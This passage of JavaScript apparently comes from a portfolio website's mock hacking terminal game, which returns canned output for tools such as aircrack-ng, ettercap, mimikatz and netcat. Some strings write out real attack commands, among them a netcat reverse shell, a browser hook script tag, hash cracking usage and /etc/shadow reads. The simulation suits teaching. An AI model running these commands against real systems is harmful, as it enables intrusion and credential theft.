                '[+] Hook URL: &lt;script src="http://127.0.0.1:3000/hook.js"&gt;&lt;/script&gt;\n' +
                '[+] RESTful API key: SIMULATED_KEY\n\n' +
                clr('green', '[*] Hooked Browsers: 3') + '\n' +
                '  [1] Chrome 120.0 @ Windows 11 (192.168.1.50)\n' +
                '  [2] Firefox 121.0 @ Ubuntu 22.04 (192.168.1.51)\n' +
                '  [3] Edge 120.0 @ Windows 10 (192.168.1.52)\n\n' +
                clr('yellow', '[*] Browser exploitation demo. XSS hooks allow remote browser control.');
        },

        // =============== WIRELESS ATTACKS ===============
        'airmon-ng': function() {
            return clr('cyan', '[*] airmon-ng \u2014 Monitor Mode') + '\n\n' +
                'PHY     Interface  Driver    Chipset\n' +
                'phy0    wlan0      ath9k     Qualcomm Atheros AR9462\n\n' +
                clr('green', '[+] wlan0 -> wlan0mon (monitor mode enabled)') + '\n' +
                '[*] Now use \'airodump-ng\' to capture wireless traffic.';
        },

        'airodump-ng': function() {
            capturedHandshake = true;
            return clr('cyan', '[*] airodump-ng \u2014 Wireless Packet Capture') + '\n\n' +
                ' BSSID              PWR  CH  ENC    ESSID\n' +
                ' \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n' +
                ' AA:BB:CC:DD:EE:01  -42  6   WPA2   GrokGalaxy_WiFi\n' +
                ' AA:BB:CC:DD:EE:02  -55  11  WPA2   TargetNetwork\n' +
                ' AA:BB:CC:DD:EE:03  -68  1   WEP    OpenNet\n' +
                ' AA:BB:CC:DD:EE:04  -71  6   WPA2   SecureBase\n\n' +
                ' STATION            PWR  BSSID              Probes\n' +
                ' \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n' +
                ' FF:FF:FF:11:22:33  -45  AA:BB:CC:DD:EE:01  GrokGalaxy_WiFi\n\n' +
                clr('green', '[+] WPA Handshake captured: GrokGalaxy_WiFi') + '\n' +
                '[*] Use \'aircrack-ng\' to crack the password.';
        },

        'aircrack-ng': function() {
            if (!capturedHandshake) return clr('red', '[ERROR]') + ' No handshake captured. Run "airodump-ng" first.';
            return clr('cyan', '[*] aircrack-ng \u2014 WPA/WPA2 Key Cracker') + '\n' +
                '[*] Reading packets from capture file...\n' +
                '[*] Using wordlist: /usr/share/wordlists/rockyou.txt\n\n' +
                '                                 Aircrack-ng 1.7\n\n' +
                '      [00:00:42] 84523/14344391 keys tested (2012.45 k/s)\n\n' +
                '      Time left: 1 hour, 57 minutes\n\n' +
                '                    ' + clr('green', 'KEY FOUND! [ CyberSec2025! ]') + '\n\n' +
                '      Master Key  : A3 F2 91 D7 4B 88 ...\n' +
                '      Transient Key: 9C 28 F3 44 ...\n\n' +
                clr('green', '[*] WiFi password cracked: CyberSec2025!');
        },

        wifite: function() {
            return clr('cyan', '  .     .  .   ____  .   .\n' +
                '  |     |__|  |      |   |  ___\n' +
                '  |  .  |  |  |---   |   | |___|\n' +
                '  |_/ \\_|  |  |      |___|\n' +
                '  WiFite v2.7.0 \u2014 Automated Wireless Auditor') + '\n\n' +
                '[*] Scanning for targets...\n' +
                '  NUM  ESSID             BSSID              CH  ENC   PWR  CLIENTS\n' +
                '  ---  ----------------  ----------------   --  ----  ---  -------\n' +
                '   1   GrokGalaxy_WiFi   AA:BB:CC:DD:EE:01   6  WPA2  -42  1\n' +
                '   2   TargetNetwork     AA:BB:CC:DD:EE:02  11  WPA2  -55  0\n' +
                '   3   OpenNet           AA:BB:CC:DD:EE:03   1  WEP   -68  2\n\n' +
                clr('yellow', '[*] Use \'aircrack-ng\' for manual control or let wifite auto-attack.');
        },

        // =============== SNIFFING & SPOOFING ===============
        wireshark: function() {
            return clr('cyan', '[*] Wireshark \u2014 Network Protocol Analyzer (CLI: tshark)') + '\n' +
                'Capturing on \'eth0\'...\n\n' +
                'No.  Time     Source          Dest            Proto  Info\n' +
                '\u2500\u2500\u2500  \u2500\u2500\u2500\u2500\u2500\u2500\u2500  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  \u2500\u2500\u2500\u2500\u2500  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n' +
                '1    0.000    10.10.14.2      ' + targetIP + '     TCP    SYN [80]\n' +
                '2    0.023    ' + targetIP + '     10.10.14.2      TCP    SYN-ACK [80]\n' +
                '3    0.024    10.10.14.2      ' + targetIP + '     TCP    ACK [80]\n' +
                '4    0.025    10.10.14.2      ' + targetIP + '     HTTP   GET /login.php\n' +
                '5    0.048    ' + targetIP + '     10.10.14.2      HTTP   200 OK\n' +
                '6    0.100    10.10.14.2      ' + targetIP + '     HTTP   POST /login.php\n' +
                clr('red', '7    0.101    10.10.14.2      ' + targetIP + '     HTTP   Credentials: admin:P@ssw0rd123!') + '\n\n' +
                clr('red', '[!] Plaintext credentials captured! HTTP is insecure \u2014 use HTTPS!');
        },

        tcpdump: function() {
            var t = new Date().toTimeString().slice(0,8);
            return clr('cyan', 'tcpdump: listening on eth0, link-type EN10MB') + '\n' +
                t + '.123456 IP 10.10.14.2.45678 > ' + targetIP + '.80: Flags [S], seq 1234567\n' +
                t + '.123789 IP ' + targetIP + '.80 > 10.10.14.2.45678: Flags [S.], seq 7654321, ack 1234568\n' +
                t + '.124012 IP 10.10.14.2.45678 > ' + targetIP + '.80: Flags [.], ack 7654322\n' +
                t + '.124345 IP 10.10.14.2.45678 > ' + targetIP + '.80: Flags [P.], HTTP GET /\n' +
                t + '.148234 ARP, Request who-has ' + targetIP + ' tell 10.10.14.2\n' +
                t + '.148567 ARP, Reply ' + targetIP + ' is-at ' + macAddr + '\n\n' +
                clr('green', '6 packets captured');
        },

        ettercap: function() {
            var subnet = targetIP.split('.').slice(0,3).join('.');
            return clr('cyan', 'ettercap 0.8.3.1 \u2014 Man-in-the-Middle Tool') + '\n\n' +
                '[*] Listening on eth0 (10.10.14.2/255.255.255.0)\n' +
                '[*] ARP poisoning targets:\n' +
                '    GROUP 1: ' + targetIP + ' (' + macAddr + ')\n' +
                '    GROUP 2: ' + subnet + '.1 (Gateway)\n\n' +
                clr('green', '[+] ARP poisoning active!') + '\n' +
                '[*] Intercepting traffic between target and gateway...\n' +
                '[*] Captured packets: 247\n' +
                clr('red', '[+] HTTP credentials captured: admin:P@ssw0rd123!') + '\n\n' +
                clr('yellow', '[!] MITM attacks are illegal without authorization. Always get written consent!');
        },

        arpspoof: function() {
            var subnet = targetIP.split('.').slice(0,3).join('.');
            return clr('cyan', '[*] arpspoof \u2014 ARP Spoofing Tool') + '\n' +
                '[*] Spoofing ' + subnet + '.1 is-at ' + macAddr + '\n' +
                '[*] Sending ARP replies to ' + targetIP + '...\n\n' +
                'AA:BB:CC:00:00:01 -> ' + macAddr + ' (spoofed)\n' +
                clr('green', '[+] ARP cache poisoned successfully!') + '\n' +
                '[*] Traffic from ' + targetIP + ' now flows through us.\n\n' +
                clr('yellow', '[*] Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward');
        },

        responder: function() {
            return clr('cyan', '  .----.-----.-----.-----.-----.-----.-----|  .-----.----.\n' +
                '  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n' +
                '  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n' +
                '                   |__|    NBT-NS/LLMNR/MDNS Poisoner v3.1') + '\n\n' +
                '[+] Listening on eth0...\n' +
                '[*] Poisoning LLMNR/NBT-NS requests...\n\n' +
                clr('green', '[+] NTLMv2 Hash captured:') + '\n' +
                '  admin::GROKGALAXY:1234567890abcdef:A1B2C3D4...\n\n' +
                clr('yellow', '[*] Crack with \'hashcat -m 5600 hash.txt wordlist.txt\'');
        },

        // =============== POST-EXPLOITATION ===============
        netcat: function() {
            return clr('cyan', '[*] Netcat (nc) \u2014 The Network Swiss Army Knife') + '\n\n' +
                'Common usages:\n' +
                '  nc -lvnp 4444              # Listen for reverse shell\n' +
                '  nc ' + targetIP + ' 80           # Connect to target\n' +
                '  nc -e /bin/bash IP 4444    # Reverse shell (traditional)\n\n' +
                clr('green', '[*] Listening on 0.0.0.0:4444...') + '\n' +
                clr('green', '[*] Connection received from ' + targetIP + ':52341') + '\n' +
                clr('green', '$ whoami') + '\n' +
                'www-data\n\n' +
                clr('yellow', '[*] Shell obtained as www-data. Run \'linpeas\' for privilege escalation.');
        },

        nc: function() { return hackingCommands.netcat(); },

        linpeas: function() {
            return clr('cyan', '\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\u2551            LinPEAS \u2014 Linux Privilege     \u2551\n\u2551           Escalation Awesome Script      \u2551\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d') + '\n\n' +
                clr('red', '[+] SUID binaries found:') + '\n' +
                '  -rwsr-xr-x /usr/bin/find\n' +
                '  -rwsr-xr-x /usr/bin/pkexec\n' +
                '  -rwsr-xr-x /usr/bin/sudo\n\n' +
                clr('red', '[+] Writable /etc/passwd!') + '\n' +
                clr('yellow', '[+] Cron jobs running as root:') + '\n' +
                '  */5 * * * * /opt/backup.sh\n' +
                clr('red', '[+] /opt/backup.sh is WRITABLE!') + '\n\n' +
                clr('green', '[+] Kernel: Linux 5.15.0-91 \u2014 CVE-2023-XXXXX may apply') + '\n' +
                clr('green', '[*] Multiple privesc vectors found! Use: find / -perm -u=s 2>/dev/null');
        },

        winpeas: function() {
            return clr('cyan', '\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\u2551          WinPEAS \u2014 Windows Privilege     \u2551\n\u2551          Escalation Awesome Script       \u2551\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d') + '\n\n' +
                clr('red', '[+] Unquoted Service Paths found:') + '\n' +
                '  C:\\Program Files\\Vuln Service\\service.exe\n' +
                clr('red', '[+] AlwaysInstallElevated is ENABLED!') + '\n' +
                clr('yellow', '[+] Stored credentials found in Credential Manager') + '\n' +
                clr('yellow', '[+] Autologon credentials in registry:') + '\n' +
                '  DefaultUserName: Administrator\n' +
                '  DefaultPassword: Admin2025!\n\n' +
                clr('green', '[*] This is a Linux terminal. WinPEAS shown for educational reference.');
        },

        mimikatz: function() {
            return clr('cyan', '  .#####.   mimikatz 2.2.0 (x64)\n' +
                ' .## ^ ##.  "A La Vie, A L\'Amour"\n' +
                ' ## / \\\\ ##  Benjamin DELPY (gentilkiwi)\n' +
                ' ## \\\\ / ##  https://blog.gentilkiwi.com\n' +
                ' \'## v ##\'\n' +
                '  \'#####\'') + '\n\n' +
                'mimikatz # sekurlsa::logonpasswords\n\n' +
                clr('green', 'Authentication Id : 0 ; 999 (00000000:000003e7)\nSession           : Interactive from 1\nUser Name         : Administrator\nDomain            : GROKGALAXY\nNTLM              : aad3b435b51404eeaad3b435b51404ee\nSHA1              : d4e97d37...') + '\n\n' +
                clr('yellow', '[*] Windows credential extraction tool. Educational demo only.') + '\n' +
                '[*] Use \'hashcat\' to crack NTLM hashes offline.';
        },

        bloodhound: function() {
            return clr('cyan', '[*] BloodHound \u2014 Active Directory Attack Path Mapping') + '\n\n' +
                '[+] Collecting AD data via SharpHound...\n' +
                '[+] Domains enumerated: GROKGALAXY.LOCAL\n' +
                '[+] Users: 142 | Groups: 38 | Computers: 27\n\n' +
                clr('red', '[!] Attack Paths to Domain Admin: 3 found') + '\n' +
                '  1. USER@grokgalaxy.local -> GenericAll -> ADMIN-GROUP -> DA\n' +
                '  2. USER@grokgalaxy.local -> HasSession -> DC01 -> DCSync -> DA\n' +
                '  3. USER@grokgalaxy.local -> WriteDACL -> OU -> GPO Abuse -> DA\n\n' +
                clr('yellow', '[*] AD attack path analysis. Used in real Red Team engagements.');
        },

        // =============== MISSION COMMANDS ===============
        hack: function() {
            if (gameProgress < 1) return clr('red', '[ERROR]') + ' No target found. Run "scan" or "nmap" first.';
            gameProgress = 2;
            return clr('red', '[HACKING]') + ' Initiating breach on ' + targetIP + '...\n' +
                '[+] Exploiting weak authentication...\n' +
                '[+] Bypassing firewall...\n' +
                '[+] Injecting payload...\n' +
                clr('green', '[\u2713] ACCESS GRANTED!') + '\n' +
                '[*] Encrypted data found. Type \'decrypt\' to decode.';
        },

        decrypt: function() {
            if (gameProgress < 2) return clr('red', '[ERROR]') + ' No data to decrypt. Complete the hack first.';
            gameProgress = 3;
            return clr('cyan', '[DECRYPTING]') + ' Running decryption algorithm...\n' +
                '[+] Breaking cipher...\n' +
                '[+] Reconstructing data...\n' +
                clr('green', '[\u2713] DECRYPTION COMPLETE!') + '\n\n' +
                clr('green', '\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\u2551  CLASSIFIED INFORMATION RETRIEVED:     \u2551\n\u2551                                        \u2551\n\u2551  Name: Shankar Adhikary                \u2551\n\u2551  Clearance: TOP SECRET                 \u2551\n\u2551  Status: Cybersecurity Expert          \u2551\n\u2551  Mission: Secure the Digital Frontier  \u2551\n\u2551                                        \u2551\n\u2551  \u0930\u093e\u0937\u094d\u091f\u094d\u0930\u0940\u092f \u0938\u0941\u0930\u0915\u094d\u0937\u093e \u0938\u0930\u094d\u0935\u094b\u092a\u0930\u093f           \u2551\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d') + '\n\n' +
                '[*] Congratulations! You completed the simulation!';
        },

        ssh: function() {
            sshConnected = true;
            return clr('cyan', '[*] ssh admin@' + targetIP) + '\n' +
                'The authenticity of host \'' + targetIP + '\' can\'t be established.\n' +
                'ED25519 key fingerprint is SHA256:xD3F...kL9m.\n' +
                'Are you sure you want to continue connecting (yes/no)? yes\n' +
                'Warning: Permanently added \'' + targetIP + '\' (ED25519) to known hosts.\n' +
                'admin@' + targetIP + '\'s password: ********\n\n' +
                clr('green', 'Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-91-generic x86_64)\n\nLast login: ' + new Date().toDateString() + ' from 10.10.14.2\n\nadmin@target:~$') + '\n' +
                clr('green', '[*] SSH connection established! You\'re in.');
        },

        // =============== SYSTEM COMMANDS ===============
        ls: function() {
            var files = fileSystem[currentDir] || ['(empty)'];
            return files.map(function(f) {
                if (f.endsWith('/')) return clr('blue', f);
                if (f.startsWith('.')) return '<span class="text-gray-500">' + f + '</span>';
                if (f.endsWith('.py') || f.endsWith('.sh')) return clr('green', f);
                if (f.endsWith('.txt') || f.endsWith('.pdf') || f.endsWith('.png')) return clr('yellow', f);
                return f;
            }).join('  ');
        },

        'll': function() {
            var files = fileSystem[currentDir] || ['(empty)'];
            var lines = ['total ' + files.length * 4];
            files.forEach(function(f) {
                var isDir = f.endsWith('/') || (!f.includes('.') && !f.startsWith('.'));
                var perm = isDir ? 'drwxr-xr-x' : '-rw-r--r--';
                var size = Math.floor(Math.random() * 10000);
                var name = isDir ? clr('blue', f) : f;
                lines.push(perm + ' 1 root root ' + String(size).padStart(6) + ' Jan 15 ' + name);
            });
            return lines.join('\n');
        },

        cd: 'CD_HANDLER',
        cat: 'CAT_HANDLER',
        pwd: function() { return currentDir; },

        id: 'uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),46(plugdev)',
        uname: 'Linux kali 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 x86_64 GNU/Linux',
        'uname -a': 'Linux kali 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.5.6-1kali1 (2023-10-09) x86_64 GNU/Linux',

        ifconfig: function() {
            return 'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n' +
                '        inet 10.10.14.2  netmask 255.255.255.0  broadcast 10.10.14.255\n' +
                '        inet6 fe80::a00:27ff:fe3e:1234  prefixlen 64\n' +
                '        ether 08:00:27:3e:12:34  txqueuelen 1000\n' +
                '        RX packets 15247  bytes 12583429 (12.0 MiB)\n' +
                '        TX packets 8923  bytes 1247381 (1.1 MiB)\n\n' +
                'lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n' +
                '        inet 127.0.0.1  netmask 255.0.0.0\n' +
                '        inet6 ::1  prefixlen 128\n\n' +
                clr('green', 'wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500') + '\n' +
                '        unspec 00-C0-CA-97-12-34  txqueuelen 1000\n' +
                '        Mode: Monitor';
        },

        ip: function() { return hackingCommands.ifconfig(); },

        ps: '  PID TTY      STAT   TIME COMMAND\n    1 ?        Ss     0:02 /sbin/init\n  234 ?        Ssl    0:15 /usr/sbin/NetworkManager\n  456 ?        S      0:00 /usr/sbin/apache2 -k start\n  789 ?        Ss     0:01 sshd: /usr/sbin/sshd\n 1234 pts/0    Ss     0:00 -bash\n 1337 pts/0    S+     0:00 python3 /root/tools/c2_server.py\n 1338 ?        S      0:00 /usr/sbin/mysqld\n 1500 pts/0    R+     0:00 ps aux',

        'ps aux': 'USER       PID %CPU %MEM    VSZ   RSS TTY   STAT TIME COMMAND\nroot         1  0.1  0.4  16884  8420 ?     Ss   0:02 /sbin/init\nroot       234  0.3  1.2  48392 24412 ?     Ssl  0:15 /usr/sbin/NetworkManager\nwww-data   456  0.0  0.8  32984 16744 ?     S    0:00 /usr/sbin/apache2\nroot       789  0.0  0.3  15420  6120 ?     Ss   0:01 sshd\nroot      1234  0.0  0.2   9584  4824 pts/0 Ss   0:00 -bash\nroot      1337  0.5  1.5  42384 30120 pts/0 S+   0:00 python3 c2_server.py\nmysql     1338  1.2  5.4 182423 108412 ?    S    0:00 /usr/sbin/mysqld',

        history: function() {
            if (commandHistory.length === 0) return '(no commands in history)';
            return commandHistory.slice(-20).map(function(c, i) { return '  ' + String(i + 1).padStart(4) + '  ' + c; }).join('\n');
        },

        neofetch: function() {
            return clr('cyan', '       _,met$$$$$gg.           ') + '<span class="text-white">root@kali</span>\n' +
                clr('cyan', '    ,g$$$$$$$$$$$$$$$P.       ') + '<span class="text-white">---------</span>\n' +
                clr('cyan', '  ,g$$P"     """Y$$."         ') + clr('yellow', 'OS:') + ' Kali GNU/Linux Rolling x86_64\n' +
                clr('cyan', ' ,$$P\'              \'$$$.      ') + clr('yellow', 'Host:') + ' Grok Galaxy Portfolio\n' +
                clr('cyan', '\',$$P       ,ggs.     \'$$b:   ') + clr('yellow', 'Kernel:') + ' 6.5.0-kali3-amd64\n' +
                clr('cyan', ' d$$\'     ,$P"\'   .    $$$    ') + clr('yellow', 'Shell:') + ' bash 5.2.15\n' +
                clr('cyan', ' $$P      d$\'     ,    $$P    ') + clr('yellow', 'Terminal:') + ' SA Portfolio v3.0\n' +
                clr('cyan', ' $$:      $$.   -    ,d$$\'    ') + clr('yellow', 'CPU:') + ' Shankar Brain @ 3.5GHz\n' +
                clr('cyan', ' $$;      Y$b._   _,d$P\'     ') + clr('yellow', 'Memory:') + ' 1337MiB / 16384MiB\n' +
                clr('cyan', ' Y$$.    \'.`"Y$$$$P"\'        ') + clr('yellow', 'Tools:') + ' 50+ Security Tools\n' +
                clr('cyan', '  \'$$b      "-.__              ') + clr('yellow', 'Uptime:') + ' ' + Math.floor(Math.random() * 30) + ' days\n' +
                clr('cyan', '   \'$$                         ') + clr('yellow', 'Certs:') + ' 25+ Certifications\n' +
                clr('cyan', '    \'$$._                      ') + clr('yellow', 'Motto:') + ' \u0930\u093e\u0937\u094d\u091f\u094d\u0930\u0940\u092f \u0938\u0941\u0930\u0915\u094d\u0937\u093e \u0938\u0930\u094d\u0935\u094b\u092a\u0930\u093f\n' +
                clr('cyan', '      \'""\'');
        },

        date: function() { return new Date().toString(); },

        uptime: function() {
            var days = Math.floor(Math.random() * 30) + 1;
            var hrs = Math.floor(Math.random() * 24);
            return ' ' + new Date().toTimeString().slice(0,8) + ' up ' + days + ' days, ' + hrs + ':' + Math.floor(Math.random()*60).toString().padStart(2,'0') + ', 2 users, load average: 0.42, 0.38, 0.31';
        },

        df: 'Filesystem     Size   Used  Avail Use% Mounted on\n/dev/sda1       50G    18G    30G  37% /\ntmpfs          7.8G   1.2M   7.8G   1% /dev/shm\n/dev/sda2      200G    95G    95G  50% /home\ntmpfs          1.6G   8.0K   1.6G   1% /tmp',

        hostname: 'kali',

        'cat /etc/passwd': function() { return fileContents['/etc/passwd']; },
        'cat /etc/shadow': function() { return fileContents['/etc/shadow']; },
        'cat /etc/hosts': function() { return fileContents['/etc/hosts']; },

        // =============== PORTFOLIO COMMANDS ===============
        whoami: clr('green', 'root') + '@grok-galaxy\nUser: Guest Hacker\nLevel: Script Kiddie -> Elite (Complete the simulation!)\nMission: Hack into Shankar\'s portfolio',

        skills: clr('cyan', '[SHANKAR\'S SKILL MATRIX]') + '\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\u2551 Cybersecurity       \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591 90%\u2551\n\u2551 Full Stack Dev      \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591 85%\u2551\n\u2551 AI / ML             \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2591\u2591\u2591 75%\u2551\n\u2551 DevOps / Cloud      \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2591\u2591\u2591\u2591 70%\u2551\n\u2551 Photography         \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591 65%\u2551\n\u2551 Reverse Engineering \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2591\u2591\u2591 70%\u2551\n\u2551 OSINT               \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591 85%\u2551\n\u2551 Red Teaming         \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591 90%\u2551\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d',

        contact: clr('cyan', '[CONTACT INFORMATION]') + '\nEmail:     adhikaryshankar04@gmail.com\nLinkedIn:  linkedin.com/in/adhikaryxshankar\nGitHub:    github.com/ShankarAdhikary\nX/Twitter: x.com/SHANKARAD2006\nInstagram: instagram.com/the0xshankar\nPortfolio: shankaradhikary.github.io/portfolio',

        certs: clr('cyan', '[CERTIFICATIONS \u2014 25+]') + '\n  [+] Fundamentals of MCP\n  [+] Cybersecurity (Tech Mahindra)\n  [+] Networking (NVIDIA)\n  [+] OSINT (Security Research)\n  [+] Python (NIELIT)\n  [+] C Programming\n  [+] Network Fundamentals (Cybrary)\n  [+] Shaastra 2026 (IIT Madras)\n  [+] Open Source Contributor (OSC Global)\n  [+] Campus Lead (OSC Global 2026)\n  ... and 15 more!',

        projects: clr('cyan', '[PROJECTS]') + '\n  [01] Open Source Connect Platform  \u2014 React, Node.js, MongoDB\n  [02] RedTeam Toolkit               \u2014 Python, Bash, Kali\n  [03] Threat Detector AI            \u2014 TensorFlow, Python\n  [04] SecureVault                   \u2014 Rust, WebAssembly\n  [05] OSINT Framework               \u2014 Python, Flask\n  [06] Vulnerability Scanner         \u2014 Python, Node.js\n  [07] AI Threat Detector            \u2014 TensorFlow, Python\n  [08] Network Monitor               \u2014 Python, React\n  [09] Phishing Detector             \u2014 NLP, Python\n  [10] Cloud Security Tool           \u2014 Python, AWS SDK',

        about: clr('cyan', '[ABOUT SHANKAR ADHIKARY]') + '\n  Name:      Shankar Adhikary\n  Age:       19 (Born 2006)\n  Education: BTech Cybersecurity @ RRU (2025-2029)\n  Focus:     Red Team | Penetration Testing | AI/ML\n  Location:  Rashtriya Raksha University, Gujarat, India\n  Motto:     \u0930\u093e\u0937\u094d\u091f\u094d\u0930\u0940\u092f \u0938\u0941\u0930\u0915\u094d\u0937\u093e \u0938\u0930\u094d\u0935\u094b\u092a\u0930\u093f (National Security is Supreme)\n  \n  Passionate cybersecurity enthusiast and aspiring Red Team specialist.\n  Campus Lead @ Open Source Connect Global 2026.',

        socials: clr('cyan', '[SOCIAL LINKS]') + '\n  GitHub:    ' + clr('green', 'github.com/ShankarAdhikary') + '\n  LinkedIn:  ' + clr('blue', 'linkedin.com/in/adhikaryxshankar') + '\n  Twitter/X: ' + clr('cyan', 'x.com/SHANKARAD2006') + '\n  Instagram: ' + clr('purple', 'instagram.com/the0xshankar') + '\n  Portfolio: ' + clr('yellow', 'shankaradhikary.github.io/portfolio'),

        // =============== UTILITIES ===============
        clear: 'CLEAR',
        exit: 'EXIT',

        reset: function() {
            gameProgress = 0;
            sshConnected = false;
            capturedHandshake = false;
            sqlTarget = false;
            currentDir = '/root';
            commandHistory = [];
            return clr('green', '[*] Simulation reset. All progress cleared. Type "help" to start.');
        },

        banner: clr('purple', '  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557  \u2588\u2588\u2557     \u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557      \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557  \u2588\u2588\u2557\u2588\u2588\u2557   \u2588\u2588\u2557\n \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2554\u255d    \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u255a\u2588\u2588\u2557\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2557 \u2588\u2588\u2554\u255d\n \u2588\u2588\u2551  \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2554\u255d     \u2588\u2588\u2551  \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2554\u255d  \u255a\u2588\u2588\u2588\u2588\u2554\u255d \n 